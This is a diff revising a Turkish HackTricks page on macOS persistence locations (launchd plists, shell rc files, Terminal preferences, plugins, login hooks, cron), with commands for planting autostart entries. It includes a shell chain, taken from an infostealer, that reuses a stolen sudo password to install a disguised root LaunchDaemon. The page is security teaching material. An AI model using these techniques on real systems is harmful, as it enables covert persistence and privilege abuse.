@@ -2,12 +2,12 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-Bu bölüm büyük ölçüde [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) blog serisini temel alır. Amaç, **daha fazla Autostart Locations** eklemek (mümkünse), günümüzde macOS'un en son sürümünde (13.4) **hangi tekniklerin hâlâ çalıştığını** belirtmek ve gereken **izinleri** açıklamaktır.
+Bu bölüm büyük ölçüde [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) blog serisini temel alır. Amaç, **daha fazla Autostart Location** eklemek (mümkünse), günümüzde macOS'un en son sürümünde (13.4) **hangi tekniklerin hâlâ çalıştığını** belirtmek ve gereken **izinleri** açıklamaktır.
 
 ## Sandbox Bypass
 
 > [!TIP]
-> Burada **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz. Bu konumlar, **root izinlerine ihtiyaç duymadan**, bir şeyi yalnızca **bir dosyaya yazarak** ve çok **yaygın** bir **eylemi**, belirli bir **süreyi** veya sandbox içinden genellikle gerçekleştirebileceğiniz bir **eylemi** bekleyerek çalıştırmanıza olanak tanır.
+> Burada, **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz. Bu konumlar, **root izinlerine ihtiyaç duymadan**, bir şeyi **bir dosyaya yazarak** ve çok **yaygın** bir **eylemi**, belirli bir **süreyi** veya sandbox içinden genellikle gerçekleştirebileceğiniz bir **eylemi** bekleyerek çalıştırmanıza olanak tanır.
 
 ### Launchd
 
@@ -18,38 +18,38 @@ Bu bölüm büyük ölçüde [**Beyond the good ol' LaunchAgents**](https://thee
 
 - **`/Library/LaunchAgents`**
 - **Trigger**: Reboot
-- Root required
+- Root gerekli
 - **`/Library/LaunchDaemons`**
 - **Trigger**: Reboot
-- Root required
+- Root gerekli
 - **`/System/Library/LaunchAgents`**
 - **Trigger**: Reboot
-- Root required
+- Root gerekli
 - **`/System/Library/LaunchDaemons`**
 - **Trigger**: Reboot
-- Root required
+- Root gerekli
 - **`~/Library/LaunchAgents`**
 - **Trigger**: Relog-in
 - **`~/Library/LaunchDemons`**
 - **Trigger**: Relog-in
 
 > [!TIP]
-> İlginç bir bilgi olarak, **`launchd`**, Mach-o içindeki `__Text.__config` bölümünde, launchd'nin başlatması gereken diğer iyi bilinen servisleri içeren gömülü bir property list'e sahiptir. Ayrıca bu servisler, çalıştırılmaları ve başarıyla tamamlanmaları gerektiği anlamına gelen `RequireSuccess`, `RequireRun` ve `RebootOnSuccess` seçeneklerini içerebilir.
+> İlginç bir bilgi olarak, **`launchd`**, Mach-o bölümü `__Text.__config` içinde gömülü bir property list'e sahiptir. Bu liste, launchd'nin başlatması gereken diğer iyi bilinen servisleri içerir. Ayrıca bu servisler, çalıştırılmaları ve başarıyla tamamlanmaları gerektiği anlamına gelen `RequireSuccess`, `RequireRun` ve `RebootOnSuccess` değerlerini içerebilir.
 >
-> Elbette code signing nedeniyle değiştirilemez.
+> Elbette, code signing nedeniyle değiştirilemez.
 
 #### Description & Exploitation
 
-**`launchd`**, OX S kernel tarafından başlangıçta çalıştırılan **ilk** **process** ve kapanış sırasında son tamamlanan process'tir. Her zaman **PID 1** olmalıdır. Bu process, aşağıdaki konumlarda bulunan **ASEP** **plist** dosyalarında belirtilen yapılandırmaları **okur ve çalıştırır**:
+**`launchd`**, OX S kernel tarafından startup sırasında çalıştırılan **ilk** **process** ve shutdown sırasında tamamlanan son process'tir. Her zaman **PID 1** olmalıdır. Bu process, aşağıdaki konumlarda bulunan **ASEP** **plist** dosyalarında belirtilen yapılandırmaları **okur ve çalıştırır**:
 
-- `/Library/LaunchAgents`: Yönetici tarafından yüklenen kullanıcı başına agents
-- `/Library/LaunchDaemons`: Yönetici tarafından yüklenen sistem genelindeki daemons
-- `/System/Library/LaunchAgents`: Apple tarafından sağlanan kullanıcı başına agents.
-- `/System/Library/LaunchDaemons`: Apple tarafından sağlanan sistem genelindeki daemons.
+- `/Library/LaunchAgents`: Admin tarafından yüklenen kullanıcı başına agent'lar
+- `/Library/LaunchDaemons`: Admin tarafından yüklenen sistem genelindeki daemon'lar
+- `/System/Library/LaunchAgents`: Apple tarafından sağlanan kullanıcı başına agent'lar.
+- `/System/Library/LaunchDaemons`: Apple tarafından sağlanan sistem genelindeki daemon'lar.
 
-Bir kullanıcı login olduğunda, `/Users/$USER/Library/LaunchAgents` ve `/Users/$USER/Library/LaunchDemons` konumlarında bulunan plist dosyaları **login olan kullanıcının izinleriyle** başlatılır.
+Bir kullanıcı login olduğunda, `/Users/$USER/Library/LaunchAgents` ve `/Users/$USER/Library/LaunchDemons` konumlarında bulunan plist'ler **login olan kullanıcı izinleriyle** başlatılır.
 
-**Agents ve daemons arasındaki temel fark, agents'ların kullanıcı login olduğunda, daemons'ların ise system startup sırasında yüklenmesidir** (örneğin ssh gibi, herhangi bir kullanıcı sisteme erişmeden önce çalıştırılması gereken servisler vardır). Ayrıca agents GUI kullanabilirken daemons arka planda çalışmalıdır.
+**Agent'lar ile daemon'lar arasındaki temel fark, agent'ların kullanıcı login olduğunda, daemon'ların ise system startup sırasında yüklenmesidir** (örneğin ssh gibi bazı servislerin, herhangi bir kullanıcı sisteme erişmeden önce çalıştırılması gerekir). Ayrıca agent'lar GUI kullanabilirken daemon'ların arka planda çalışması gerekir.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
@@ -72,26 +72,26 @@ Bir kullanıcı login olduğunda, `/Users/$USER/Library/LaunchAgents` ve `/Users
 </dict>
 </plist>
 ```
-**kullanıcı giriş yapmadan önce** bir **agent'ın çalıştırılması gereken** durumlar vardır; bunlara **PreLoginAgents** denir. Örneğin bu, giriş sırasında yardımcı teknoloji sağlamak için kullanışlıdır. Bunlar ayrıca `/Library/LaunchAgents` içinde bulunabilir ([**burada**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) bir örneğe bakın).
+**kullanıcı giriş yapmadan önce çalıştırılması gereken** durumlar vardır; bunlara **PreLoginAgents** denir. Örneğin bu, giriş sırasında yardımcı teknolojiler sağlamak için kullanışlıdır. Bunlar ayrıca `/Library/LaunchAgents` konumunda bulunabilir ([**burada**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) bir örnek görebilirsiniz).
 
 > [!TIP]
-> Yeni Daemons veya Agents config dosyaları **bir sonraki yeniden başlatmadan sonra veya** `launchctl load <target.plist>` kullanılarak **yüklenecektir**. `.plist` uzantısı olmayan dosyaları **yüklemek de mümkündür**: `launchctl -F <file>` (ancak bu plist dosyaları yeniden başlatmadan sonra otomatik olarak yüklenmez).\
-> `launchctl unload <target.plist>` ile **unload** etmek de mümkündür (bu dosyanın işaret ettiği process sonlandırılır),
+> Yeni Daemons veya Agents yapılandırma dosyaları **bir sonraki yeniden başlatmadan sonra veya** `launchctl load <target.plist>` **kullanılarak yüklenecektir.** `.plist` uzantısı olmayan dosyaları **yüklemek de mümkündür:** `launchctl -F <file>` (ancak bu plist dosyaları yeniden başlatmadan sonra otomatik olarak yüklenmez).\
+> `launchctl unload <target.plist>` ile **kaldırmak** da mümkündür (bu dosyanın işaret ettiği process sonlandırılır),
 >
-> Bir **Agent** veya **Daemon**'ın **çalışmasını** **engelleyen** herhangi bir şeyin (örneğin bir override) **olmadığından emin olmak** için şunu çalıştırın: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
+> Bir **Agent** veya **Daemon**'ın **çalışmasını** **engelleyen** herhangi bir şeyin (örneğin bir override) **olmadığından** emin olmak için şunu çalıştırın: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
 
-Mevcut kullanıcı tarafından yüklenen tüm agent ve daemon'ları listeleyin:
+Mevcut kullanıcı tarafından yüklenen tüm agents ve daemons'ları listeleyin:
 ```bash
 launchctl list
 ```
-#### Örnek kötü amaçlı LaunchDaemon zinciri (password reuse)
+#### Örnek kötü amaçlı LaunchDaemon zinciri (parola yeniden kullanımı)
 
-Yakın zamanda görülen bir macOS infostealer, bir **captured sudo password** kullanarak bir user agent ve root LaunchDaemon yerleştirdi:
+Yakın zamanda görülen bir macOS infostealer, bir **ele geçirilmiş sudo parolasını** yeniden kullanarak bir user agent ve root LaunchDaemon yerleştirdi:<sup>[1]</sup>
 
-- Agent döngüsünü `~/.agent` konumuna yazın ve çalıştırılabilir hâle getirin.
+- Agent döngüsünü `~/.agent` konumuna yazın ve çalıştırılabilir yapın.
 - Bu agent'ı işaret eden bir plist'i `/tmp/starter` konumunda oluşturun.
-- Çalınan password'ü `sudo -S` ile yeniden kullanarak dosyayı `/Library/LaunchDaemons/com.finder.helper.plist` konumuna kopyalayın, sahibini `root:wheel` olarak ayarlayın ve `launchctl load` ile yükleyin.
-- Çıktıyı ayırmak için `nohup ~/.agent >/dev/null 2>&1 &` kullanarak agent'ı sessizce başlatın.
+- Çalınan parolayı `sudo -S` ile yeniden kullanarak dosyayı `/Library/LaunchDaemons/com.finder.helper.plist` konumuna kopyalayın, `root:wheel` olarak ayarlayın ve `launchctl load` ile yükleyin.
+- Çıktıyı ayırmak için agent'ı `nohup ~/.agent >/dev/null 2>&1 &` ile sessizce başlatın.
 ```bash
 printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
 printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
@@ -99,64 +99,64 @@ printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.h
 nohup "$HOME/.agent" >/dev/null 2>&1 &
 ```
 > [!WARNING]
-> Bir plist bir kullanıcıya aitse, daemon system wide klasörlerinde olsa bile, **task kullanıcı olarak** ve root olarak değil **yürütülür**. Bu, bazı privilege escalation saldırılarını engelleyebilir.
+> Bir plist bir kullanıcıya aitse, daemon sistem genelindeki klasörlerde bulunsa bile **görev root olarak değil kullanıcı olarak çalıştırılır**. Bu durum bazı privilege escalation saldırılarını önleyebilir.
 
 #### launchd hakkında daha fazla bilgi
 
-**`launchd`**, **kernel** tarafından başlatılan ilk **user mode** process'tir. Process'in başlatılması **başarılı olmalıdır** ve process **çıkamaz veya crash olamaz**. Hatta bazı **killing signals**'lara karşı **korumalıdır**.
+**`launchd`**, **kernel** tarafından başlatılan **ilk user mode process**'tir. Process başlangıcı **başarılı olmalıdır** ve process **çıkamaz veya crash olamaz**. Ayrıca bazı **killing signal**'larına karşı **korumalıdır**.
 
 `launchd`'nin yapacağı ilk şeylerden biri, tüm **daemon**'ları başlatmaktır:
 
-- Zamanlanarak yürütülen **Timer daemon**'ları:
+- Zamanlanmış olarak çalıştırılacak **Timer daemon**'ları:
 - atd (`com.apple.atrun.plist`): 30 dakikalık bir `StartInterval` değerine sahiptir
-- crond (`com.apple.systemstats.daily.plist`): 00:15'te başlatılmak üzere `StartCalendarInterval` değerine sahiptir
+- crond (`com.apple.systemstats.daily.plist`): 00:15'te başlatılmak için `StartCalendarInterval` değerine sahiptir
 - **Network daemon**'ları:
-- `org.cups.cups-lpd`: TCP üzerinde (`SockType: stream`), `printer` adlı `SockServiceName` ile dinler
-- SockServiceName bir port veya `/etc/services` içindeki bir service olmalıdır
+- `org.cups.cups-lpd`: TCP üzerinde (`SockType: stream`), `SockServiceName: printer` ile dinleme yapar
+- SockServiceName bir port veya `/etc/services` içindeki bir servis olmalıdır
 - `com.apple.xscertd.plist`: TCP üzerinde 1640 portunu dinler
-- Belirtilen bir path değiştiğinde yürütülen **Path daemon**'ları:
+- Belirtilen bir path değiştiğinde çalıştırılan **Path daemon**'ları:
 - `com.apple.postfix.master`: `/etc/postfix/aliases` path'ini kontrol eder
 - **IOKit notification daemon**'ları:
 - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
 - **Mach port:**
 - `com.apple.xscertd-helper.plist`: `MachServices` entry'sinde `com.apple.xscertd.helper` adını belirtir
 - **UserEventAgent:**
-- Bu, önceki örnekten farklıdır. Belirli bir event'e yanıt olarak launchd'nin app'leri spawn etmesini sağlar. Ancak bu durumda ilgili ana binary `launchd` değil, `/usr/libexec/UserEventAgent`'dır. SIP restricted folder olan `/System/Library/UserEventPlugins/` içinden plugin'leri yükler. Her plugin, `XPCEventModuleInitializer` key'inde initializer'ını belirtir veya eski plugin'lerde, `Info.plist` dosyasının `FB86416D-6164-2070-726F-70735C216EC0` key'i altındaki `CFPluginFactories` dict'inde belirtir.
+- Bu, önceki örnekten farklıdır. Belirli bir event'e yanıt olarak launchd'nin app'leri spawn etmesini sağlar. Ancak bu durumda ilgili ana binary `launchd` değil, `/usr/libexec/UserEventAgent`'tır. SIP tarafından kısıtlanan `/System/Library/UserEventPlugins/` klasöründeki plugin'leri yükler. Her plugin, initializer'ını `XPCEventModuleInitializer` key'inde veya eski plugin'ler için `Info.plist` dosyasının `FB86416D-6164-2070-726F-70735C216EC0` key'i altındaki `CFPluginFactories` dict'inde belirtir.
 
 ### shell startup files
 
-Yazı: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
-Yazı (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
+Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)
 
 - sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
 - TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
-- Ancak bu dosyaları yükleyen bir shell'i yürüten ve TCC bypass özelliğine sahip bir app bulmanız gerekir
+- Ancak bu dosyaları yükleyen bir shell çalıştıran ve TCC bypass'a sahip bir app bulmanız gerekir
 
 #### Konumlar
 
 - **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
-- **Trigger**: zsh ile bir terminal açın
+- **Trigger**: zsh ile bir terminal açmak
 - **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
-- **Trigger**: zsh ile bir terminal açın
-- Root gerekir
+- **Trigger**: zsh ile bir terminal açmak
+- Root gereklidir
 - **`~/.zlogout`**
-- **Trigger**: zsh ile bir terminalden çıkın
+- **Trigger**: zsh ile bir terminalden çıkmak
 - **`/etc/zlogout`**
-- **Trigger**: zsh ile bir terminalden çıkın
-- Root gerekir
+- **Trigger**: zsh ile bir terminalden çıkmak
+- Root gereklidir
 - Potansiyel olarak daha fazlası: **`man zsh`**
 - **`~/.bashrc`**
-- **Trigger**: bash ile bir terminal açın
+- **Trigger**: bash ile bir terminal açmak
 - `/etc/profile` (çalışmadı)
 - `~/.profile` (çalışmadı)
 - `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
-- **Trigger**: xterm ile tetiklenmesi beklenir, ancak **installed değildir** ve installed edildikten sonra bile şu error alınır: xterm: `DISPLAY is not set`
+- **Trigger**: xterm ile çalışması beklenir, ancak **kurulu değildir**; kurulduktan sonra bile şu hata alınır: xterm: `DISPLAY is not set`<sup>[3]</sup>
 
 #### Açıklama ve Exploitation
 
-`zsh` veya `bash` gibi bir shell environment başlatıldığında, **belirli startup file'lar çalıştırılır**. macOS şu anda varsayılan shell olarak `/bin/zsh` kullanır. Bu shell, Terminal application başlatıldığında veya bir device SSH üzerinden erişildiğinde otomatik olarak açılır. `bash` ve `sh` macOS'ta mevcut olsa da kullanılmaları için açıkça çağrılmaları gerekir.
+`zsh` veya `bash` gibi bir shell environment başlatıldığında **bazı startup file'lar çalıştırılır**. macOS şu anda varsayılan shell olarak `/bin/zsh` kullanır. Terminal application başlatıldığında veya bir cihaza SSH üzerinden erişildiğinde bu shell'e otomatik olarak erişilir. `bash` ve `sh` macOS'ta mevcut olsa da kullanılmaları için açıkça çağrılmaları gerekir.<sup>[2]</sup>
 
-**`man zsh`** ile okuyabileceğimiz zsh man page'i, startup file'lar hakkında uzun bir açıklamaya sahiptir.
+**`man zsh`** ile okuyabileceğimiz zsh man page'i, startup file'ları hakkında uzun bir açıklama içerir.
 ```bash
 # Example executino via ~/.zshrc
 echo "touch /tmp/hacktricks" >> ~/.zshrc
@@ -164,23 +164,23 @@ echo "touch /tmp/hacktricks" >> ~/.zshrc
 ### Yeniden Açılan Uygulamalar
 
 > [!CAUTION]
-> Belirtilen exploitation yöntemini yapılandırmak ve oturumu kapatıp yeniden açmak, hatta yeniden başlatmak uygulamayı çalıştırmam için işe yaramadı. (Uygulama çalıştırılmıyordu; bu işlemler gerçekleştirilirken çalışıyor olması gerekebilir.)
+> Belirtilen exploitation işlemini yapılandırmak ve oturumu kapatıp yeniden açmak veya hatta yeniden başlatmak, uygulamayı çalıştırmam için işe yaramadı. (Uygulama çalıştırılmıyordu; belki de bu işlemler gerçekleştirilirken çalışıyor olması gerekiyordur.)
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)
 
-- Sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
+- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Konum
 
 - **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
-- **Trigger**: Yeniden başlatıldığında uygulamaların yeniden açılması
+- **Tetikleyici**: Yeniden başlatma sonrasında uygulamaların yeniden açılması
 
 #### Açıklama ve Exploitation
 
-Yeniden açılacak tüm uygulamalar `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` plist dosyasının içindedir.
+Yeniden açılacak tüm uygulamalar `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` plist dosyasının içindedir<sup>[4]</sup>
 
-Bu nedenle yeniden açılacak uygulamaların kendi uygulamanızı çalıştırmasını sağlamak için **uygulamanızı listeye eklemeniz** yeterlidir.
+Bu nedenle, yeniden açılacak uygulamaların sizin uygulamanızı başlatmasını sağlamak için **uygulamanızı listeye eklemeniz** yeterlidir.
 
 UUID, bu dizin listelenerek veya `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` komutuyla bulunabilir.
 
@@ -190,7 +190,7 @@ defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
 #or
 plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 ```
-**Bu listeye bir uygulama eklemek için** şunu kullanabilirsiniz:
+Bu listeye **bir uygulama eklemek** için şunu kullanabilirsiniz:
 ```bash
 # Adding iTerm2
 /usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
@@ -200,20 +200,22 @@ plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
 ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 ```
-### Terminal Preferences
+### Terminal Tercihleri
 
-- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)
+
+- sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
 - TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-- Terminal use to have FDA permissions of the user use it
+- Terminal, kullanıcının kullandığı uygulamanın FDA izinlerine sahip olur
 
-#### Location
+#### Konum
 
 - **`~/Library/Preferences/com.apple.Terminal.plist`**
-- **Trigger**: Open Terminal
+- **Tetikleyici**: Terminal'i açmak
 
-#### Description & Exploitation
+#### Açıklama ve Exploitation
 
-**`~/Library/Preferences`** içinde kullanıcının Applications'lara ait tercihleri saklanır. Bu tercihlerin bazıları, **diğer applications/script'leri execute etmek** için bir yapılandırma içerebilir.
+**`~/Library/Preferences`** içinde, Applications'daki kullanıcının tercihleri saklanır. Bu tercihlerden bazıları, **diğer applications/script'leri execute etmek** için bir configuration içerebilir.<sup>[5]</sup>
 
 Örneğin Terminal, Startup sırasında bir command execute edebilir:
 
@@ -235,9 +237,9 @@ Bu config, **`~/Library/Preferences/com.apple.Terminal.plist`** dosyasına şu �
 }
 [...]
 ```
-Yani, sistemdeki terminal tercihlerinin plist dosyasının üzerine yazılabiliyorsa, **`open`** işlevi **terminali açmak ve bu komutun çalıştırılmasını sağlamak** için kullanılabilir.
+Yani, sistemdeki terminal tercihlerinin plist dosyasının üzerine yazılabilirse, **`open`** işlevi **terminali açmak ve bu komutu çalıştırmak** için kullanılabilir.
 
-Bunu CLI üzerinden şu şekilde ekleyebilirsiniz:
+Bunu cli üzerinden şu şekilde ekleyebilirsiniz:
 ```bash
 # Add
 /usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
@@ -246,20 +248,20 @@ Bunu CLI üzerinden şu şekilde ekleyebilirsiniz:
 # Remove
 /usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
 ```
-### Terminal Scripts / Other file extensions
+### Terminal Script'leri / Diğer dosya uzantıları
 
-- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Sandbox'u bypass etmek için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
 - TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-- Terminal kullanılarak kullanıcının FDA izinlerine sahip olunabilir
+- Terminal kullanımı, kullanıcının FDA izinlerine sahip olur
 
-#### Location
+#### Konum
 
 - **Anywhere**
 - **Trigger**: Terminal'i aç
 
-#### Description & Exploitation
+#### Açıklama ve Exploitation
 
-Bir [**`.terminal`** script'i](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) oluşturup açarsanız, **Terminal application** otomatik olarak başlatılır ve içindeki belirtilen komutları çalıştırır. Terminal app'in bazı özel ayrıcalıkları (TCC gibi) varsa komutunuz bu özel ayrıcalıklarla çalıştırılır.
+Bir [**`.terminal`** script'i](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) oluşturup açarsanız, **Terminal uygulaması** içindeki belirtilen komutları çalıştırmak üzere otomatik olarak başlatılır. Terminal uygulamasının bazı özel ayrıcalıkları varsa (TCC gibi), komutunuz bu özel ayrıcalıklarla çalıştırılır.
 
 Şununla deneyin:
 ```bash
@@ -294,12 +296,12 @@ Ayrıca normal shell script içeriğiyle **`.command`**, **`.tool`** uzantılar�
 > [!CAUTION]
 > Terminal'de **Full Disk Access** varsa bu işlemi tamamlayabilir (çalıştırılan komutun bir Terminal penceresinde görünür olacağını unutmayın).
 
-### Audio Plugin'leri
+### Audio Plugins
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
 Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
 
-- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
+- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
 - TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
 - Bazı ek TCC erişimleri elde edebilirsiniz
 
@@ -307,25 +309,25 @@ Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://
 
 - **`/Library/Audio/Plug-Ins/HAL`**
 - Root gerekli
-- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatmak
+- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatın
 - **`/Library/Audio/Plug-ins/Components`**
 - Root gerekli
-- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatmak
+- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatın
 - **`~/Library/Audio/Plug-ins/Components`**
-- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatmak
+- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatın
 - **`/System/Library/Components`**
 - Root gerekli
-- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatmak
+- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatın
 
 #### Açıklama
 
-Önceki writeup'lara göre bazı **audio plugin'lerini derlemek** ve yüklenmelerini sağlamak mümkündür.
+Önceki writeup'lara göre bazı audio plugin'lerini **derlemek** ve yüklenmelerini sağlamak mümkündür.<sup>[6][7]</sup>
 
-### QuickLook Plugin'leri
+### QuickLook Plugins
 
-Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)
 
-- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
+- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
 - TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
 - Bazı ek TCC erişimleri elde edebilirsiniz
 
@@ -339,26 +341,26 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.g
 
 #### Açıklama ve Exploitation
 
-QuickLook plugin'leri, **bir dosyanın önizlemesini tetiklediğinizde** (Finder'da dosya seçiliyken boşluk çubuğuna bastığınızda) ve **bu dosya türünü destekleyen bir plugin** yüklü olduğunda çalıştırılabilir.
+QuickLook plugin'leri, bir dosyanın **önizlemesini tetiklediğinizde** (Finder'da dosya seçiliyken boşluk çubuğuna bastığınızda) ve bu dosya türünü **destekleyen bir plugin** yüklü olduğunda çalıştırılabilir.<sup>[8]</sup>
 
-Kendi QuickLook plugin'inizi derlemek, yüklenmesi için önceki konumlardan birine yerleştirmek ve ardından desteklenen bir dosyaya gidip tetiklemek için boşluk çubuğuna basmak mümkündür.
+Kendi QuickLook plugin'inizi derleyip önceki konumlardan birine yerleştirerek yüklenmesini sağlayabilir, ardından desteklenen bir dosyaya gidip tetiklemek için boşluk çubuğuna basabilirsiniz.
 
-### ~~Login/Logout Hook'ları~~
+### ~~Login/Logout Hooks~~
 
 > [!CAUTION]
-> Bu işlem bende ne user LoginHook ile ne de root LogoutHook ile çalıştı.
+> Bu işlem bende ne kullanıcı LoginHook'u ne de root LogoutHook'u ile çalıştı.
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)
 
-- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
+- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Konum
 
-- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` gibi bir şeyi çalıştırabilmeniz gerekir
-- `~/Library/Preferences/com.apple.loginwindow.plist` konumunda bulunur
+- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` benzeri bir şeyi çalıştırabilmeniz gerekir.
+- `~/Library/Preferences/com.apple.loginwindow.plist` konumunda bulunur.
 
-Kullanımdan kaldırılmışlardır ancak bir user Login yaptığında komutları çalıştırmak için kullanılabilirler.
+Kullanımdan kaldırılmıştır, ancak bir kullanıcı giriş yaptığında komutları çalıştırmak için kullanılabilirler.<sup>[9]</sup>
 ```bash
 cat > $HOME/hook.sh << EOF
 #!/bin/bash
@@ -385,20 +387,20 @@ Silmek için:
 defaults delete com.apple.loginwindow LoginHook
 defaults delete com.apple.loginwindow LogoutHook
 ```
-Root kullanıcıya ait olan şu konumda saklanır: **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**
+Root kullanıcıya ait olan `/private/var/root/Library/Preferences/com.apple.loginwindow.plist` içinde saklanır.
 
 ## Koşullu Sandbox Bypass
 
 > [!TIP]
-> Burada, bir şeyi **bir dosyaya yazarak** çalıştırmanıza ve belirli **programların kurulu olması**, **"yaygın olmayan" kullanıcı** eylemleri veya ortamlar gibi **çok yaygın olmayan koşulları** beklemenize olanak tanıyan **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz.
+> Burada, bir şeyi **bir dosyaya yazarak** çalıştırmanıza ve belirli **programların yüklü olması**, "alışılmadık" kullanıcı eylemleri veya ortamlar gibi çok yaygın olmayan koşulları **beklemenize** olanak tanıyan **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz.
 
 ### Cron
 
-**Yazı**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)
+**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)
 
 - Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
-- Ancak `crontab` binary'sini çalıştırabiliyor olmanız gerekir
-- Veya root olmanız gerekir
+- Ancak `crontab` binary'sini çalıştırabilmeniz gerekir
+- Ya da root olmanız gerekir
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Konum
@@ -409,20 +411,20 @@ Root kullanıcıya ait olan şu konumda saklanır: **`/private/var/root/Library/
 
 #### Açıklama ve Exploitation
 
-**Mevcut kullanıcının** cron job'larını şu komutla listeleyin:
+**Mevcut kullanıcının** cron job'larını şununla listeleyin:
 ```bash
 crontab -l
 ```
